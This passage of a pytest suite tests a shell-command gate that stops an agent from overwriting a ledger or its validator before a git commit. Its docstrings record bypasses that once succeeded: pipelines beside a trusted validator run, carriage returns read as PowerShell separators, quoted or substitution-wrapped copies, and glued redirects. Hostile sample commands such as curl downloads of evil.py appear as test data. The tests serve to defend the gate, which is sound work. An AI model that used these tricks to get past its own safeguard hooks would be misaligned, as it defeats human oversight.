    ("a pipe into it", "tee %s"),
    ("an in-place edit driven by xargs", "xargs sed -i s/a/b/ %s"),
    ("a download onto it", "curl -o %s http://x/evil.py"),
    ("an install onto it", "install evil.py %s"),
    ("a delete", "rm %s"),
)
_NEIGHBOURS_THAT_ONLY_READ = (
    ("a grep on the output", "grep INVALID"),
    ("a line count", "wc -l"),
    ("a checksum", "sha256sum"),
)


@pytest.mark.parametrize("target", ("the judge", "the ledger"))
@pytest.mark.parametrize("what,neighbour", _WRITING_NEIGHBOURS)
@pytest.mark.parametrize("where,step,vouched,judge,ledger", _VOUCHED_STAGES)
def test_a_vouched_run_frees_its_own_stage_and_not_its_neighbours(
        tmp_path, where, step, vouched, judge, ledger, what, neighbour, target):
    """Vouching frees the STAGE it stands in, never the stages beside it.

    A segment here is a whole pipeline on purpose (`|` is not a separator in
    `_SEGMENT_SPLIT_RX`), so an exemption written as "skip this segment" hands the pipeline to the
    attacker. That has now happened three times, once per exemption, each a round after it was
    corrected for the previous one: the entry point, then the canonical validator, then the bare
    name after a step into `scripts/`. The last one ran end to end in one session — `cd scripts &&
    python ledger_add.py --validate ../ledger/2026.csv | tee ledger_add.py` was rc 0 through the
    registered chain, truncated the ledger's own judge to zero bytes, and the commit that had been
    refused a moment earlier then went through.

    So the property is asked of every vouched run and every neighbour, rather than of the eight
    spellings the last hole was measured in. Each neighbour is asserted refused ON ITS OWN first:
    without that the pipeline case could pass because the neighbour stopped being a write, which is
    exactly how an entry in a table like this dies quietly. BOTH ORDERS, because a stage is judged
    by what it is and not by where it stands — and the vouched-run-LAST spelling was a second live
    hole at the same time as the first (`cd scripts && tee ledger_add.py | python ledger_add.py
    --validate ../ledger/2026.csv && git commit` was rc 0 as well). The counter-end — a neighbour
    that only reads stays allowed — is `test_a_reading_neighbour_of_a_vouched_run_is_still_allowed`.
    """
    ledger_repo(tmp_path)
    stage = neighbour % (judge if target == "the judge" else ledger)
    alone = "%s%s && git commit -m x" % (step, stage)
    assert run_ledger(tmp_path, shell(tmp_path, alone)).returncode == 2, "alone: %s" % alone
    for pipeline in ("%s | %s" % (vouched, stage), "%s | %s" % (stage, vouched)):
        beside = "%s%s && git commit -m x" % (step, pipeline)
        assert run_ledger(tmp_path, shell(tmp_path, beside)).returncode == 2, "beside: %s" % beside


@pytest.mark.parametrize("what,neighbour", _NEIGHBOURS_THAT_ONLY_READ)
@pytest.mark.parametrize("where,step,vouched,judge,ledger", _VOUCHED_STAGES)
def test_a_reading_neighbour_of_a_vouched_run_is_still_allowed(
        tmp_path, where, step, vouched, judge, ledger, what, neighbour):
    """The counter-end of the property above, without which it could be satisfied by refusing every
    pipeline: piping a vouched run into a reader is how its output is looked at, and the validator
    run is the gate's own advertised way out of a block."""
    ledger_repo(tmp_path)
    command = "%s%s | %s && git commit -m x" % (step, vouched, neighbour)
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 0, "%s / %s was refused:\n%s" % (where, what, result.stderr)


# EVERY PATTERN THAT HANDS OUT A VOUCHING EXEMPTION, so the anchor property below is asked of all
# of them rather than of the one a finding happened to be measured in. This is a list, so it
# carries the tripwire an unavoidable list owes: `test_every_vouching_run_pattern_is_named_here`
# reads back the patterns the exemption's own code consults, so an entry that has died and a fourth
# exemption that arrives without one both fail it — whatever the fourth one is CALLED.
_VOUCHING_RUN_PATTERNS = (
    ("_ENTRY_POINT_RUN_RX", "python scripts/harness.py doctor"),
    ("_LEDGER_ADD_RUN_RX", "python scripts/ledger_add.py --validate ledger/2026.csv"),
    ("_BARE_VALIDATOR_RUN_RX", "python ledger_add.py --validate ../ledger/2026.csv"),
)
# ...and the patterns that same code consults WITHOUT vouching: `_only_the_bare_validator` reads
# every validator mention on its stage in order to REFUSE one that carries a directory part. Named
# here so the check below can be an equality instead of a subset — a subset is satisfied by any
# pattern that arrives later.
_REFUSING_PATTERNS_OF_THE_EXEMPTION = ("_ANY_VALIDATOR_PATH_RX",)


def _patterns_within(value, depth=4):
    """Every `re.Pattern` inside `value`, however many containers deep it sits.

    A module-level name does not have to BE a pattern to hand one to the code that names it: a
    tuple of them behind `any(...)` is the shape the house rule "definitions, not enumerations"
    pushes an exemption towards, and the reader below saw nothing of it until this existed.
    Bounded rather than fully recursive, because a cyclic or huge module constant must not turn a
    test into a hang.
    """
    if isinstance(value, re.Pattern):
        return [value]
    if depth <= 0:
        return []
    members = ()
    if isinstance(value, dict):
        members = tuple(value.keys()) + tuple(value.values())
    elif isinstance(value, (tuple, list, set, frozenset)):
        members = tuple(value)
    out = []
    for member in members:
        out.extend(_patterns_within(member, depth - 1))
    return out


def _patterns_consulted_by(gate, entry):
    """Every module-level regex the function `entry` reaches by a name its SOURCE spells.

    Off the PARSED source, because the naming convention is not the property: an exemption is one
    the exemption CODE asks, under any name. Three ways of reaching one are followed, each because
    a measured construction used it: the pattern named directly; a pattern inside a module-level
    CONTAINER the code names (`_patterns_within`); and either through another module-level function
    or through a module-level LAMBDA, transitively -- the third shipped exemption already lives in
    a helper (`_only_the_bare_validator`) and a fourth may do the same.

    WHAT IT DOES NOT READ is every pattern this chain of names does not END at, and that class is
    bigger than it looks -- the previous version of this paragraph called it "a pattern whose NAME
    the source does not contain" and was refuted by a construction that spells BOTH names:
    a module-level tuple of PREDICATE FUNCTIONS (`_MORE_VOUCHERS = (_extra_vouch,)`, called through
    `any(f(stage) for f in _MORE_VOUCHERS)`), where the container holds no pattern and its name is
    no function body. `globals()["_EXTRA_VOUCH"]` is invisible here for the same reason. Rather than
    widen the enumeration a third time, `_patterns_called_by` asks the question the other way round
    and the test below takes the UNION of the two -- measured, both of those are RED there while
    this reader stays green.
    """
    tree = ast.parse(pathlib.Path(gate.__file__).read_text(encoding="utf-8"))
    bodies = {node.name: node for node in tree.body if isinstance(node, ast.FunctionDef)}
    for node in tree.body:                      # a module-level lambda is a body under a name too
        if isinstance(node, ast.Assign) and isinstance(node.value, ast.Lambda):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    bodies.setdefault(target.id, node.value)
    seen, todo, found = set(), [entry], set()
    while todo:
        name = todo.pop()
        if name in seen or name not in bodies:
            continue
        seen.add(name)
        for node in ast.walk(bodies[name]):
            if not isinstance(node, ast.Name):
                continue
            if _patterns_within(getattr(gate, node.id, None)):
                found.add(node.id)
            elif node.id in bodies:
                todo.append(node.id)
    return found


class _RecordingPattern(object):
    """A stand-in for a compiled regex that notes the moment it is ASKED anything.

    Delegating rather than subclassing, because `re.Pattern` is a C type that cannot be subclassed
    and whose methods cannot be replaced. Every attribute is handed on; a CALLABLE one is wrapped so
    that `search`, `match`, `fullmatch`, `finditer`, `sub` and the rest all count as being asked --
    which of them a caller uses is the caller's business and must not decide whether it is seen.
    """

    def __init__(self, pattern, note):
        self.__dict__["_pattern"] = pattern
        self.__dict__["_note"] = note

    def __getattr__(self, name):
        attribute = getattr(self.__dict__["_pattern"], name)
        if not callable(attribute):
            return attribute
        note = self.__dict__["_note"]

        def recorded(*args, **kwargs):
            note()
            return attribute(*args, **kwargs)
        return recorded


def _recorders_for(value, note, depth=4):
    """`value` with every `re.Pattern` in it replaced by a `_RecordingPattern`, or None.

    None means "nothing to instrument here", so a caller can leave the attribute untouched instead
    of rebuilding it. Containers are rebuilt rather than mutated, and only to the same bounded depth
    `_patterns_within` reads to -- the two must agree, or a pattern could be found by one and left
    uninstrumented by the other.
    """
    if isinstance(value, re.Pattern):
        return _RecordingPattern(value, note)
    if depth <= 0:
        return None
    if isinstance(value, dict):
        rebuilt = {key: (_recorders_for(item, note, depth - 1) or item)
                   for key, item in value.items()}
        return rebuilt if _patterns_within(value, depth) else None
    if isinstance(value, (tuple, list, set, frozenset)):
        rebuilt = type(value)((_recorders_for(item, note, depth - 1) or item) for item in value)
        return rebuilt if _patterns_within(value, depth) else None
    return None


def _patterns_called_by(gate, entry, probes):
    """Every module-level regex `entry` really ASKS while it runs over `probes`.

    THE OTHER HALF OF `_patterns_consulted_by`, and the reason there are two: that one follows names
    through the parsed source and therefore sees every path but only the names it can resolve; this
    one resolves nothing and sees only the paths the probes take. Their blind spots do not overlap,
    so the test below takes the UNION. Measured: a fourth exemption held in a module-level tuple of
    predicate FUNCTIONS is invisible to the first and caught here, and so is one fetched through
    `globals()[...]`.

    WHAT NEITHER OF THEM SEES, and it is now a class rather than a list of spellings: an exemption
    that consults no `re.Pattern` AT ALL, and a pattern that is asked only for an input outside
    `probes`. The first is measured, not supposed -- an arm spelled
    `stage.strip().startswith("deno ")` frees the stage and both readers stay green -- and it is the
    price of asking the question about PATTERNS; catching it needs a different question again
    (which stage does the exemption free), which the behaviour tests above ask for the verbs they
    enumerate. The second is why `_VOUCH_PROBES` includes stages that match NOTHING, so an `or`
    chain is walked to its end instead of short-circuiting at its first arm.
    """
    called = set()
    restore = {}
    for name in dir(gate):
        recorders = _recorders_for(getattr(gate, name), lambda n=name: called.add(n))
        if recorders is not None:
            restore[name] = getattr(gate, name)
            setattr(gate, name, recorders)
    try:
        function = getattr(gate, entry)
        for arguments in probes:
            try:
                function(*arguments)
            except Exception:                     # noqa: BLE001 — a probe that raises still counts
                pass                              # for what it asked before it did
    finally:
        for name, value in restore.items():
            setattr(gate, name, value)
    return called


# Stages fed to the exemption so that every arm of its decision is walked. The FIRST two match
# nothing on purpose: an `or` chain short-circuits at its first hit, so a probe that vouches would
# hide every pattern behind it. `inside_scripts` is asked both ways because the third exemption is
# reached only under one of them.
_VOUCH_PROBES = tuple(
    (stage, inside_scripts)
    for stage in ("cat notes.md",
                  "tee scripts/ledger_add.py",
                  "python scripts/harness.py doctor",
                  "python scripts/ledger_add.py --validate ledger/2026.csv",
                  "python ledger_add.py --validate ../ledger/2026.csv",
                  "python scripts/ledger_add.py --help | cat")
    for inside_scripts in (False, True))


def test_every_vouching_run_pattern_is_named_here():
    """Both ends of the list above: no entry may be dead, and no exemption may be missing from it.

    Asked of the exemption's own code rather than of the `*_RUN_RX` spelling. The previous cut
    compared the module's `*_RUN_RX` names, so a hand-written fourth pattern under any other name
    left it green while freeing stages — measured with a fourth run inserted into
    `_stages_beside_the_vouched_runs` as `_EXTRA_VOUCH`, which is exactly the shape the docstring
    claimed to catch.

    HOW FAR THAT REACHES IS THE TWO READERS' ANSWER AND NOT THIS DOCSTRING'S, which is the
    correction this paragraph exists for. It promised "one it reads is on one of the two lists or
    this fails" twice, and was refuted twice: first by a pattern under any other name, then --
    after the name-following reader had been widened to containers and lambdas -- by the CROSSING
    of the two, a module-level tuple of predicate FUNCTIONS, which spells both names and resolves to
    no pattern. Widening an enumeration a third time is the move that produced both refutations, so
    the second reader asks the opposite question instead (`_patterns_called_by`: which patterns does
    the exemption really ASK while it runs) and this takes the UNION. What the union still does not
    see is stated at `_patterns_called_by` and is a class, not a list of spellings.
    """
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    expected = ({name for name, _ in _VOUCHING_RUN_PATTERNS}
                | set(_REFUSING_PATTERNS_OF_THE_EXEMPTION))
    entry = "_stages_beside_the_vouched_runs"
    named = _patterns_consulted_by(gate, entry)
    called = _patterns_called_by(gate, entry, _VOUCH_PROBES)
    assert named | called == expected, "named %s, called %s" % (sorted(named), sorted(called))
    # ...and the running half must really run: an instrumentation that recorded nothing would make
    # the union collapse onto the reader it was added to cover for, silently.
    assert called, "no pattern was asked at all — the probes or the instrumentation are broken"
    for name, run in _VOUCHING_RUN_PATTERNS:
        assert getattr(gate, name).search(run), "%s no longer matches its own run: %s" % (name, run)


def _may_open_a_vouched_stage(gate, char, run):
    """May `char` stand in front of `run` INSIDE ONE STAGE, once the gate has cut the line?

    Two halves, and the second is the one prose kept skipping: a character the cut REMOVES on its
    way to a stage never reaches this position from any caller, so whatever the pattern answers for
    it is unobservable — and an expectation that pins that answer pins a fiction. That is how `\\r`
    came to be fixed here as a legal opening at the very moment PowerShell was reading it as a
    statement separator. So the cut is asked (`_normalise_pipeline`, `_SEGMENT_SPLIT_RX`, the stage
    split) instead of being assumed.
    """
    stages = [stage
              for segment in gate._SEGMENT_SPLIT_RX.split(gate._normalise_pipeline(char + run))
              for stage in segment.split("|")]
    return (char.isspace() or char == "(") and char + run in stages


@pytest.mark.parametrize("char", sorted(string.printable))
@pytest.mark.parametrize("name,run", _VOUCHING_RUN_PATTERNS)
def test_only_a_group_opening_stands_in_front_of_a_vouched_run(name, run, char):
    """A vouched run is the BEGINNING of the stage it vouches for, and this is that property asked
    character by character instead of at the one spelling a finding arrived in.

    Every reader of these patterns is handed ONE pipeline stage, and the prefix used to be the
    class `[;&|(]`. Three of those four were already dead: `;` and `&` are cut by
    `_SEGMENT_SPLIT_RX` and `|` by the stage split, so no stage can contain them. The fourth, `(`,
    can stand ANYWHERE in a stage — including quoted argument prose, which is the very text the
    exemption exists to let through. So a stage that WRITES could be read as the vouched stage
    instead of standing beside one: `cd scripts && tee ledger_add.py '(python ledger_add.py
    --validate ../ledger/2026.csv)' < /dev/null && git commit` was rc 0 through the registered
    chain, left the ledger's own judge at zero bytes, and released the commit that had just been
    refused — measured against `tee`, `rm`, `sed -i` and `curl -o`, at the judge and at the ledger,
    on all three runs, in both shells.

    The expectation is stated here as a property and not read off the pattern, so the two can
    disagree: whitespace, because a stage keeps the space the split left in front of it, and `(`,
    because at the START of a stage a paren is the subshell spelling of the same command and
    `(python scripts/ledger_add.py --validate …)` is a run this gate does vouch for. Anything else
    in that position is a character of somebody's argument.

    A LINE BREAK is neither, and that half is measured against the gate's own cut rather than
    argued (`_may_open_a_vouched_stage`): the cut removes it, so no caller can hand the pattern a
    stage beginning with one. The previous cut of this test asserted plain `str.isspace()` and so
    demanded that `\\r` be accepted here — while `_normalise_pipeline` was not reading `\\r` as a
    line break at all and PowerShell was ending a statement at it. Sampled over `string.printable`
    rather than over the characters that came up.
    """
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    vouches = getattr(gate, name).search(char + run) is not None
    may_open_a_stage = _may_open_a_vouched_stage(gate, char, run)
    assert vouches is may_open_a_stage, (
        "%s reads %r in front of its run as %s" % (name, char, "an opening" if vouches else "prose"))


@pytest.mark.parametrize("name,run", _VOUCHING_RUN_PATTERNS)
def test_stage_openings_stack_in_front_of_a_vouched_run(name, run):
    """`*` in that position and not `?`, because openings COMBINE.

    `(python …)` is one opening, `((python …))` is two and an indented stage inside a group is a
    third spelling of the same run; with `?` the first is vouched for and the other two are read as
    somebody's argument text. The quantifier had no case behind it: measured with `?` in its place,
    every failure in this file is a case of THIS test — the character test above passes either way,
    because one opening is all it ever puts there.

    The set is the one the character test measures, so an opening that stops being one cannot
    survive here as a pair, and the size assertion keeps the loop from quietly measuring nothing.
    """
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    openings = [char for char in string.printable if _may_open_a_vouched_stage(gate, char, run)]
    assert len(openings) > 1, "one opening or none: %r" % openings
    pattern = getattr(gate, name)
    for first in openings:
        for second in openings:
            assert pattern.search(first + second + run), (
                "%s reads %r in front of its run as prose" % (name, first + second))


@pytest.mark.parametrize("target", ("the judge", "the ledger"))
@pytest.mark.parametrize("where,step,vouched,judge,ledger", _VOUCHED_STAGES)
def test_a_vouched_run_is_the_start_of_the_stage_it_frees(tmp_path, where, step, vouched, judge,
                                                          ledger, target):
    """The same property through the running hook, in the shape it was measured in.

    `test_a_vouched_run_frees_its_own_stage_and_not_its_neighbours` composes the vouched run and
    the writing stage as SEPARATE stages, so it cannot see a writing stage that IS the vouched one.
    Here the run stands in that stage's own quoted argument, which is what the old anchor accepted.
    The second half is the counter-end and is what stops this from being answered by refusing every
    paren: the subshell spelling of the same run, as its own stage, must stay allowed."""
    ledger_repo(tmp_path)
    written = judge if target == "the judge" else ledger
    prose = "%stee %s '(%s)' < /dev/null && git commit -m x" % (step, written, vouched)
    assert run_ledger(tmp_path, shell(tmp_path, prose)).returncode == 2, prose
    opened = "%s(%s) && git commit -m x" % (step, vouched)
    result = run_ledger(tmp_path, shell(tmp_path, opened))
    assert result.returncode == 0, "%s was refused:\n%s" % (opened, result.stderr)


# WHAT STANDS BEHIND A CARRIAGE RETURN, once the gate reads one as the line break PowerShell reads
# it as. One write per shell family, because the tool rail is the caller's choice and the line's
# meaning is not.
_STAGES_BEHIND_A_CARRIAGE_RETURN = (
    ("a PowerShell write to the ledger", "Set-Content -Path ledger/2026.csv -Value 'id,doc_date,x'"),
    ("a POSIX write to the ledger", "tee ledger/2026.csv"),
    ("a write to the ledger's own judge", "tee scripts/ledger_add.py"),
)


@pytest.mark.parametrize("tool", ("Bash", "PowerShell"))
@pytest.mark.parametrize("what,write", _STAGES_BEHIND_A_CARRIAGE_RETURN)
def test_a_carriage_return_ends_a_stage_the_way_powershell_ends_a_statement(
        tmp_path, what, write, tool):
    """A stage ends at a carriage return, because one of the two shells this gate is registered on
    ends a STATEMENT there.

    Measured on both gated shells: `echo one<CR>echo two` prints `oneecho two` under bash — one
    command — and two lines under PowerShell. With the CR unread, the vouched run in front of it
    swallowed everything behind it as its own argument text, so the write was never a stage of its
    own: `python scripts/ledger_add.py --validate ledger/2026.csv<CR>Set-Content -Path
    ledger/2026.csv …<CR>git commit -am poisoned` was rc 0 from this gate, rc 0 from powershell and
    left the poisoned books in git HEAD — one gated call, measured end to end on a scaffolded
    office project outside the repo.

    Asked on both tool rails, because the tool name is the attacker's choice: a refusal that
    depended on it would be decided by the caller. The counter-end — that reading the CR as a line
    break does not tear a command off its own flag — is
    `test_a_carriage_return_does_not_tear_a_command_off_its_own_flag`.
    """
    ledger_repo(tmp_path)
    command = "python scripts/ledger_add.py --validate ledger/2026.csv\r%s\rgit commit -m x" % write
    payload = dict(shell(tmp_path, command), tool_name=tool)
    assert run_ledger(tmp_path, payload).returncode == 2, repr(command)


def test_a_carriage_return_does_not_tear_a_command_off_its_own_flag(tmp_path):
    """The other half of that choice: the CR is rewritten INTO the newline rather than added to
    `_SEGMENT_SPLIT_RX`, so every rule that puts a newline back together keeps seeing it.

    Added to the separator class instead — the one-character fix — `find ledger<CR> -delete` is cut
    between the verb and the flag that makes it a write, which is the defect
    `_NEWLINE_BEFORE_FLAG_RX` exists for, reintroduced through a second spelling of the line break.
    Measured with that spelling in the class: this line goes to rc 0.

    The last case is the false-alarm end: a CRLF-formatted pair of reads must stay allowed, or the
    CR could be answered by refusing every line that carries one.
    """
    ledger_repo(tmp_path)
    for spelling in ("\r", "\n", "\r\n"):
        command = "find ledger%s -delete && git commit -m x" % spelling
        assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(command)
    allowed = "git status\r\ngit diff && git commit -m x"
    result = run_ledger(tmp_path, shell(tmp_path, allowed))
    assert result.returncode == 0, "%r was refused:\n%s" % (allowed, result.stderr)


# WHAT A NEIGHBOUR OF A VOUCHED RUN MAY DO WITH A DECOY VALIDATOR, and the two conditions that
# decide it. `alone` carries no blocked operation and no ledger path; `blocked` adds the commit;
# `ledger` adds a ledger path to the vouched run as well.
_DECOY_NEIGHBOURS = (
    ("writes the decoy", "tee tools/ledger_add.py", 2, 2, 2),
    ("runs the decoy", "python tools/ledger_add.py", 0, 2, 2),
    ("only reads the decoy", "cat tools/ledger_add.py", 0, 0, 2),
)


@pytest.mark.parametrize("what,neighbour,alone,blocked,ledger", _DECOY_NEIGHBOURS)
def test_a_decoy_run_beside_a_vouched_run_is_refused_only_with_a_blocked_op(
        tmp_path, what, neighbour, alone, blocked, ledger):
    """The announced price of `H62`, measured instead of described — and the three rows do not
    share one answer.

    Writing the decoy is refused whatever else the line does: `_writes_protected` is asked of every
    shell line. RUNNING it is not a write, so the only reader that sees it is the decoy check in
    `_a_reading_writes_the_ledger`, which `handle_pre_tool_use` asks under `blocked_op` — without a
    commit/push/report in the same line the run is rc 0. Reading it goes the same way one step
    later, once a ledger path puts the per-segment decoy check in play at all.

    This is here because the gate's own paragraph said "writes or runs it is refused" for a round,
    while all three of `… --help | python tools/ledger_add.py` and its sisters were rc 0 — an
    over-alarming claim in the very paragraph whose job is to say what is NOT bought.
    """
    ledger_repo(tmp_path)
    lines = (("python scripts/ledger_add.py --help | %s" % neighbour, alone),
             ("python scripts/ledger_add.py --help | %s && git commit -m x" % neighbour, blocked),
             ("python scripts/ledger_add.py --validate ledger/2026.csv | %s && git commit -m x"
              % neighbour, ledger))
    for command, want in lines:
        result = run_ledger(tmp_path, shell(tmp_path, command))
        assert result.returncode == want, "%r: rc %d, wanted %d\n%s" % (
            command, result.returncode, want, result.stderr)


# Lines the two shells this kit gates read DIFFERENTLY, which is what makes the monotonicity check
# below measure anything: each of them must produce two readings, and the check asserts that no
# single reading is stricter than all of them together.
_LINES_THE_SHELLS_DISAGREE_ABOUT = (
    # the POSIX reading turns `c\d` into `cd`, the PowerShell reading does not -- so the step into
    # the validator's directory exists in exactly one of them
    "echo start ; c\\d scripts ; python ledger_add.py --validate ledger/2026.csv ; git commit -m x",
    "echo start ; c\\d scripts ; python ledger_add.py ledger/2026.csv ; git commit -m x",
    # ...and a decoy path whose separator only one reading keeps
    "python tools\\ledger_add.py && git commit -m x",
    "python scripts\\ledger_add.py --validate ledger/2026.csv && git commit -m x",
)


@pytest.mark.parametrize("line", _LINES_THE_SHELLS_DISAGREE_ABOUT)
def test_a_second_shell_reading_can_only_add_refusals(line):
    """The monotonicity `_readings_of` claims, measured instead of asserted in prose.

    The previous cut of this test could not fail. It ran over lines with no backslash in them, so
    every line had exactly ONE reading, and it compared `judge(line)` with `judge(single)` where
    `judge` resolved its argument again — the assertion was `judge(line) or not judge(line)`. Two
    mutations that restore real defects (the whole-command exemption, and dropping the second
    reading) left it green.

    It is now asked of lines the two shells really disagree about — pinned by the `len(readings)`
    assertion, so the tautology cannot come back silently — and the single reading is judged by the
    per-reading predicate, which does not resolve anything a second time.

    The property was FALSE when this was built: `_readings_of` joined its readings into one text
    and `inside_scripts` was computed over that text, so a `cd scripts` present only in the POSIX
    reading exempted the PowerShell reading as well — where no `cd` had happened and the bare name
    is the attacker's own program. Measured exit 0 through the registered chain, and PowerShell's
    `;` runs the rest whatever the failed `cd` did."""
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    readings = gate._readings_of(line)
    assert len(readings) == 2, (
        "%r has %d reading(s); with one reading this case asserts nothing" % (line, len(readings)))
    for whole, per_reading in ((gate._writes_ledger, gate._a_reading_writes_the_ledger),
                               (gate._writes_protected, gate._a_reading_writes_protected)):
        for single in readings:
            assert whole(line) or not per_reading(single), (
                "a reading on its own refuses %r while all of them together do not: %r"
                % (line, single))


def test_the_resolved_view_keeps_every_reading_the_shells_disagree_about(tmp_path):
    """...and the construction that makes the check above meaningful: where the two shells read a
    line differently, BOTH readings reach the judges. Taking only the first one passed every test
    in this file when the verifier mutated it, which is what a construction nobody measures looks
    like."""
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    backslash = gate._readings_of("python tools/ledger_add\\.py")
    assert len(backslash) == 2, backslash
    assert "ledger_add/.py" in backslash[0] and "ledger_add.py" in backslash[1]
    assert len(gate._readings_of("python tools/ledger_add.py")) == 1


@pytest.mark.parametrize("what,command,expected", [
    ("a copy into the quoted directory", 'cp evil.py "scripts/" && git commit -m x', 2),
    ("a recursive copy into it", 'cp -r evil/. "scripts/" && git commit -m x', 2),
    ("an rsync into it", 'rsync -a evil/ "scripts/" && git commit -m x', 2),
    ("a move into it", 'mv evil.py "scripts/" && git commit -m x', 2),
    ("the same without quotes, which always refused", "cp -r evil/. scripts/ && git commit -m x", 2),
    # ...and a redirect GLUED to the script argument, which the strip used to swallow with it
    ("a redirect glued to the script argument",
     "python scripts/ledger_add.py>scripts/ledger_add.py && git commit -m x", 2),
    ("the same as an append",
     "python scripts/ledger_add.py>>scripts/ledger_add.py && git commit -m x", 2),
    # ...and the direction that says the pre-filter did not simply start refusing that folder
    ("an ordinary read in that folder", 'ruff check "scripts/" && git commit -m x', 0),
    ("the remedy, whose script path the pre-filter still strips",
     'python "scripts/ledger_add.py" --validate ledger/2026.csv && git commit -m x', 0),
    ("the remedy with its output redirected somewhere harmless",
     "python scripts/ledger_add.py --validate ledger/2026.csv>/tmp/out && git commit -m x", 0),
])
def test_the_prefilter_sees_everything_the_decision_sees(tmp_path, what, command, expected):
    """A cheap pre-filter in front of an expensive decision must not be NARROWER than it.

    The judge-write branch asked `_PROTECTED_RX`/`_PROTECTED_DIR_RX` of the RAW command and only
    then called `_writes_protected`, which resolves quoting first. A quote mark between a copy verb
    and its destination is invisible to the raw view — the copy branch of `_PROTECTED_DIR_RX` has
    no place for one, while the flag branch does — so `cp -r evil/. "scripts/" && git commit`
    overwrote the validator's directory and committed: rc 0 at HEAD, before this round and after
    it, with `_writes_protected` answering True the whole time. Nothing was gained by the narrower
    view; the refusal was simply never reached.

    The second way to be narrower is to REMOVE too much: the pre-filter strips the script argument
    of an interpreter run, and `\\S+` ran that token straight through a glued `>` — so `python
    scripts/ledger_add.py>scripts/ledger_add.py` lost its redirect target along with the run and
    left no protected path in the view at all. rc 0 from this gate for a line that truncates the
    judge, while the spaced spelling of the same line was rc 2.

    Both directions are here, because widening a pre-filter is how the previous widening of this
    gate bought false refusals."""
    ledger_repo(tmp_path)
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == expected, "%s:\n%s" % (what, result.stderr)


def test_the_remedy_this_gate_prints_is_one_it_accepts(tmp_path):
    """`BUG-0064`, in the direction the refusal text itself creates: the gate names a validator
    path and a ledger path in its own message, and the operator types that line back.

    `VALIDATOR` was built with `os.path.join`, so on Windows the message read `python
    scripts\\ledger_add.py --validate …` while the findings list above it named `ledger/2026.csv`.
    That mixed line was REFUSED — one of the two shell readings consumes the backslash, the
    canonical path is gone in that reading, and a ledger path beside an unvouched interpreter run
    is a write. Measured rc 2 while both uniform spellings were rc 0.

    Both paths are read out of the message the gate actually printed rather than written here a
    second time: a hand copy of a message is a claim about the message, and the message is the
    thing under test."""
    ledger = ledger_repo(tmp_path, rows=BAD_ROW)
    refusal = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
    assert refusal.returncode == 2, refusal.stderr
    validator = re.search(r"`python (\S+) --validate", refusal.stderr)
    named_ledger = re.search(r"^\s{2}(\S+\.csv):", refusal.stderr, re.MULTILINE)
    assert validator and named_ledger, (
        "the refusal no longer prints a remedy command and a findings list this test can read "
        "back; without both, it measures nothing:\n%s" % refusal.stderr)
    write(str(ledger), LEDGER_COLS + GOOD_ROW)
    command = "python %s --validate %s && git commit -m x" % (validator.group(1),
                                                              named_ledger.group(1))
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 0, "the line this gate printed is one it refuses: %s\n%s" % (
        command, result.stderr)


def test_the_remedy_typed_from_inside_the_validators_directory_still_works(tmp_path):
    """The direction the exemption exists for, and the one an over-narrow rule would take away:
    the bare name after the step is the canonical validator, and running it is how an agent under
    a ledger block gets out. This line was refused before this round for an unrelated reason — the
    decoy check stood in front of the exemption — so the remedy the refusal text advertises could
    not be typed."""
    ledger_repo(tmp_path)
    command = "cd scripts && python ledger_add.py --validate ../ledger/2026.csv && git commit -m x"
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 0, result.stderr


# A substitution's OPENING is a segment separator here; its CLOSING paren stays glued to the word
# in front of it. Every shape below ends the destination word with a paren, which is why they are
# one table: the property is where the word ends, not which of the three spellings opened it.
_A_PAREN_ENDS_THE_TARGET_WORD = (
    ("a command substitution around an extraction into the validator's folder",
     "echo \"$(tar -xf evil.tar -C scripts/)\" && git commit -m x"),
    ("a command substitution around a copy into the validator's folder",
     "echo \"$(cp evil.py scripts/)\" && git commit -m x"),
    ("the backtick spelling of the same substitution",
     "echo \"`tar -xf evil.tar -C scripts/`\" && git commit -m x"),
    ("a bare subshell around the copy",
     "(cp evil.py scripts/) && git commit -m x"),
    ("a substitution in the vouched validator's own note",
     "python scripts/ledger_add.py --validate ledger/2026.csv --note \"$(cp evil.py scripts/)\" "
     "&& git commit -m x"),
)


@pytest.mark.parametrize("what,command", _A_PAREN_ENDS_THE_TARGET_WORD)
def test_a_closing_paren_ends_a_word_for_this_reader_too(tmp_path, what, command):
    """BUG-0065. `_SUBSTITUTION_OPEN_RX` turns the OPENING of a substitution into a separator, so
    the write inside it becomes a segment of its own — but the closing paren stayed attached to the
    destination, and both closers of `_PROTECTED_DIR_RX` accepted only whitespace, a quote, `;`,
    `|`, `&` or end of text. The word this reader saw was `scripts/)`, which is not the directory,
    so the extraction ran and the commit went through: exit 0 through the registered chain, at HEAD
    and after the first TSK-0083 rework. The backtick spelling needed the same character for the
    same reason and was measured missing from the first cut of `_WORD_END`."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what


@pytest.mark.parametrize("what,command", [
    ("parentheses in the entry point's summary",
     "python scripts/harness.py evidence --summary \"net 1,19 (ok) booked via "
     "scripts/ledger_add.py\" && git commit -m x"),
    ("parentheses in a commit message",
     "git commit -m 'total 1,19 (ok) for ledger/2026.csv'"),
    ("parentheses in the validator's own note",
     "python scripts/ledger_add.py --validate ledger/2026.csv --note \"1,19 (ok)\" "
     "&& git commit -m x"),
])
def test_parentheses_in_prose_are_still_prose(tmp_path, what, command):
    """The counter-direction BUG-0065 asks for by name: a paren ends a WORD, it does not open a
    command. Ending the word is what the fix does; the alternative considered and dropped was to
    make a closing paren a SEGMENT boundary, which would have cut ordinary money prose (`1,19
    (ok)`) into command fragments."""
    ledger_repo(tmp_path)
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 0, "%s was refused:\n%s" % (what, result.stderr)


@pytest.mark.parametrize("what,command,expected", [
    ("the second target empties the ledger, then commit",
     "cat ledger/2026.csv > /tmp/a > ledger/2026.csv && git commit -m x", 2),
